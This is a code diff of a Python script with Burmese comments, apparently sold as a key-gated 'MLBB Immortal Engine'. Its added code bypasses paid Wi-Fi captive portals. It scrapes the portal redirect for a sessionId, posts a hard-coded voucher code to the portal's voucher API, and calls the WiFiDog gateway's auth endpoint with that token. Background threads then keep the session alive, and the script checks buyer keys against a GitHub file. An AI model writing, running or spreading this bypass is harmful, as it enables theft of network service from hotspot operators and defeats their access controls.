@@ -1,57 +1,75 @@
-import os
-import time
-import threading
-import requests
+import requests, re, urllib3, time, threading, os, socket
+from urllib.parse import urlparse, parse_qs, urljoin
 
-def bypass_logic():
-    # Ko ရဲ့ Starlink Bypass / VPN script ကို ဒီမှာ run ပါ
-    # ဥပမာ- os.system("python alpro.py")
-    pass
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+GAME_UA = "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36"
 
+# --- [ SECTION 1: KO PHYO'S STARLINK ENGINE ] ---
+def immortal_pulse(auth_link, session):
+    while True:
+        try:
+            session.get(auth_link, timeout=3, headers={"User-Agent": GAME_UA})
+            socket.gethostbyname("1.1.1.1")
+            time.sleep(0.3) 
+        except: time.sleep(1)
+
+def start_starlink_engine():
+    """ Ko ပေးထားတဲ့ Bypass Logic အစစ် """
+    main_session = requests.Session()
+    while True:
+        try:
+            r = main_session.get("http://connectivitycheck.gstatic.com/generate_204", timeout=5)
+            if r.status_code != 204:
+                p_url = r.url
+                r1 = main_session.get(p_url, timeout=5)
+                match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
+                n_url = urljoin(p_url, match.group(1)) if match else p_url
+                r2 = main_session.get(n_url, timeout=5)
+                sid = parse_qs(urlparse(r2.url).query).get('sessionId', [None])[0]
+                if sid:
+                    p_host = f"{urlparse(p_url).scheme}://{urlparse(p_url).netloc}"
+                    main_session.post(f"{p_host}/api/auth/voucher/", json={'accessCode': '123456', 'sessionId': sid}, timeout=5)
+                    gw = parse_qs(urlparse(p_url).query).get('gw_address', ['192.168.60.1'])[0]
+                    port = parse_qs(urlparse(p_url).query).get('gw_port', ['2060'])[0]
+                    auth_link = f"http://{gw}:{port}/wifidog/auth?token={sid}"
+                    for _ in range(3):
+                        threading.Thread(target=immortal_pulse, args=(auth_link, main_session), daemon=True).start()
+            time.sleep(10)
+        except: time.sleep(5)
+
+# --- [ SECTION 2: KEY VERIFICATION SYSTEM ] ---
 def main():
     os.system('clear')
-    print("==============================")
-    print("   MLBB V12 PRO - BYPASS FIX  ")
-    print("==============================")
-    
-    user_key = input("[?] Enter Your Key: ").strip()
+    print("\033[96m⚔️  MLBB IMMORTAL ENGINE v12.0 (HYBRID)  ⚔️\033[0m")
+    user_key = input("\033[93m[?] Enter Your Key: \033[0m").strip()
 
-    # ၁။ Bypass ကို အရင်စဖွင့်မယ်
-    print("\n[🚀] Bypassing Internet... Please wait.")
-    threading.Thread(target=bypass_logic, daemon=True).start()
+    # ၁။ Key ရိုက်လိုက်တာနဲ့ Starlink Engine ကို Background မှာ တန်းဖွင့်ပေးမယ် (အင်တာနက်စရအောင်)
+    print("\033[94m[*] Initializing Starlink Bypass Engine...\033[0m")
+    threading.Thread(target=start_starlink_engine, daemon=True).start()
 
-    print("[*] Waiting for Internet Connection (Max 60s)...")
-    
-    # ၂။ အင်တာနက် လုံးဝပွင့်လာတဲ့အထိ ၆၀ စက္ကန့် စောင့်ပြီး Key စစ်မယ်
+    # ၂။ အင်တာနက်ရလာတဲ့အထိ ၆၀ စက္ကန့် စောင့်ပြီး GitHub က Key နဲ့ တိုက်စစ်မယ်
     url = "https://raw.githubusercontent.com/kophyo-ops/mlbb-v12/main/keys.txt"
-    
     start_time = time.time()
-    success = False
-
+    
+    print("\033[94m[*] Waiting for Internet Connection (Max 60s)...\033[0m")
+    
     while time.time() - start_time < 60:
         try:
-            # အင်တာနက်ရပြီဆိုတာနဲ့ GitHub ကို လှမ်းစစ်မယ်
-            # Timeout ကို ၂ စက္ကန့်ပဲ ထားထားတယ် (မြန်မြန်စစ်ဖို့)
-            r = requests.get(url, timeout=2)
+            r = requests.get(url, timeout=3)
             if r.status_code == 200:
                 if user_key in r.text:
-                    success = True
-                    print("\n[✓] Key Verified Online!")
-                    print("[✓] Login Success! Unlimited Access.")
-                    # ဒီမှာ Tool ရဲ့ Main Menu ကို ပေးဝင်လိုက်ပါ
+                    print("\033[92m\n[✓] KEY VERIFIED! ACCESS UNLOCKED.\033[0m")
+                    # ဒီမှာ Tool ရဲ့ Main Menu ကို ပေးဝင်ပါ
+                    # os.system("python main_menu.py")
                     while True: time.sleep(100)
                 else:
-                    print("\n[!] Error: Key မမှန်ပါ။")
+                    print("\033[91m\n[!] Error: Key မမှန်ကန်ပါ။\033[0m")
                     os._exit(0)
-        except:
-            # အင်တာနက် မရသေးရင် ဘာမှမလုပ်ဘဲ ထပ်စစ်မယ်
-            pass
-        time.sleep(1)
+        except: pass
+        time.sleep(2)
 
-    if not success:
-        print("\n\n[!] Error: အင်တာနက် ချိတ်ဆက်မှု မအောင်မြင်ပါ။")
-        print("[!] ၆၀ စက္ကန့်အတွင်း Bypass မအောင်မြင်သောကြောင့် ပိတ်လိုက်ပါပြီ။")
-        os._exit(0)
+    print("\033[91m\n[!] Timeout: Bypass မအောင်မြင်သောကြောင့် ပိတ်လိုက်ပါပြီ။\033[0m")
+    os._exit(0)
 
 if __name__ == "__main__":
     main()
